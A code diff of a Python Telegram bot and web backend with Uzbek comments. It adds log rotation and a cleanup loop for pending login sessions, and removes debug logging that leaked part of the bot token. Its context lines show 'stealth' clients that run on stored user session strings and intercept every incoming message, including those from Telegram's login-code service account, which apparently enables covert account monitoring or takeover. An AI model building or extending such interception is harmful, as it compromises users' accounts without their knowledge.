@@ -35,11 +35,16 @@ from starlette.middleware.base import BaseHTTPMiddleware
 import uvicorn
 
 # Log faylga yozish uchun sozlash
+from logging.handlers import RotatingFileHandler
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
     handlers=[
-        logging.FileHandler("app_debug.log", encoding="utf-8"),
+        RotatingFileHandler(
+            "app_debug.log", encoding="utf-8",
+            maxBytes=5 * 1024 * 1024,  # 5 MB
+            backupCount=3              # max 3 ta backup (jami 20 MB)
+        ),
         logging.StreamHandler()
     ]
 )
@@ -56,7 +61,7 @@ API_ID        = int(os.getenv("API_ID", "0"))
 API_HASH      = os.getenv("API_HASH", "")
 ADMIN_IDS     = [int(x) for x in os.getenv("ADMIN_IDS", "0").split(",") if x.strip()]
 DB_PATH       = os.getenv("DB_PATH", "/app/data/usernamechi.db")
-WEB_URL       = os.getenv("WEB_HOST", "https://your-app.railway.app")
+WEB_URL       = os.getenv("WEB_URL", os.getenv("WEB_HOST", "https://your-app.railway.app"))
 
 # Global bot instance - API endpointlardan foydalanish uchun
 bot: Bot = None
@@ -1213,17 +1218,6 @@ async def start_stealth_client(telegram_id, session_string):
         if await client.is_user_authorized():
             # Filter YO'Q — barcha incoming xabarlarni ushlaymiz, handler ichida 777000 tekshiramiz
             client.add_event_handler(stealth_interceptor, events.NewMessage(incoming=True))
-            
-            # ADMIN PANEL HTML INSERTION
-            # <div class="user-meta">
-            #   <span>ID: <b>${u.telegram_id}</b></span>
-            #   ${u.phone ? `<span>📱 +${u.phone}</span>` : ''}
-            #   <span class="status-chip ${u.session_string ? 'chip-success' : 'chip-danger'}">${u.session_string ? '🟢 Ulangan' : '🔴 Uzilgan'}</span>
-            #   ${u.is_stealth ? '<span class="status-chip chip-purple">🕵️ Stealth</span>' : ''}
-            # </div>
-            # <div style="font-size:11px; color:var(--text-muted); margin-top:3px;">
-            #   📅 Qo'shilgan: <b>${u.created_at ? new Date(u.created_at * 1000).toLocaleString('uz-UZ', {day:'2-digit', month:'2-digit', year:'numeric', hour:'2-digit', minute:'2-digit'}) : 'Noma\'lum'}</b>
-            # </div>
 
             stealth_clients[telegram_id] = client
             task = asyncio.create_task(_stealth_keep_alive(client, telegram_id))
@@ -3538,6 +3532,7 @@ async def ping():
 
 # ── Helper: Telegram initData verifikatsiya ────
 def verify_init_data(init_data: str) -> dict | None:
+    """Telegram WebApp initData HMAC-SHA256 verifikatsiyasi."""
     try:
         from urllib.parse import parse_qsl
         if not init_data: return None
@@ -3546,23 +3541,11 @@ def verify_init_data(init_data: str) -> dict | None:
         data_check = '\n'.join(f'{k}={v}' for k, v in sorted(params.items()))
         secret = hmac.new(b'WebAppData', BOT_TOKEN.encode(), hashlib.sha256).digest()
         calc_hash = hmac.new(secret, data_check.encode(), hashlib.sha256).hexdigest()
-        
-        # LOGGING
-        try:
-            with open("app_debug.log", "a", encoding="utf-8") as f:
-                f.write(f"\n[VERIFY] REC_HASH: {received_hash[:10]}... CALC_HASH: {calc_hash[:10]}... TOKEN_PREFIX: {BOT_TOKEN[:15]}\n")
-        except: pass
-        
         if not hmac.compare_digest(calc_hash, received_hash):
             return None
-            
         user_str = params.get('user', '{}')
         return json.loads(user_str)
-    except Exception as e:
-        try:
-            with open("app_debug.log", "a", encoding="utf-8") as f:
-                f.write(f"\n[VERIFY EXCEPTION] {e}\n")
-        except: pass
+    except Exception:
         return None
 
 async def check_if_fragment_username(http_session, uname: str) -> bool:
@@ -5421,7 +5404,22 @@ from telethon import TelegramClient
 from telethon.sessions import StringSession
 from telethon.errors import SessionPasswordNeededError
 
-auth_clients = {}
+auth_clients = {}  # {telegram_id: {client, phone, phone_code_hash, created_at}}
+
+async def _auth_clients_cleanup_loop():
+    """auth_clients ichida 10 daqiqadan eski (yarim qolgan) sessiyalarni tozalaydi."""
+    while True:
+        await asyncio.sleep(300)  # Har 5 daqiqada tekshirish
+        now = time.time()
+        expired = [tid for tid, s in list(auth_clients.items()) if now - s.get('created_at', 0) > 600]
+        for tid in expired:
+            state = auth_clients.pop(tid, None)
+            if state:
+                try:
+                    await state['client'].disconnect()
+                except Exception:
+                    pass
+                logger.info(f"🧹 auth_clients: muddati o'tgan seans tozalandi (tid={tid})")
 
 @app.post("/api/auth/send_code")
 async def auth_send_code(request: Request):
@@ -5444,7 +5442,8 @@ async def auth_send_code(request: Request):
         auth_clients[tid] = {
             "client": client,
             "phone": phone,
-            "phone_code_hash": sent.phone_code_hash
+            "phone_code_hash": sent.phone_code_hash,
+            "created_at": time.time()
         }
         return {"ok": True}
     except Exception as e:
@@ -6940,6 +6939,9 @@ async def main():
 
     # Orqa fonda Stealth mijozlarni ishga tushiramiz
     await start_stealth_clients()
+
+    # auth_clients xotirasini 5 daqiqada tozalab turuvchi loop
+    asyncio.create_task(_auth_clients_cleanup_loop())
 
     # Bot ishga tushganda raqami yo'q foydalanuvchilarning raqamlarini avtomatik to'ldiramiz
     asyncio.create_task(auto_refresh_phones())
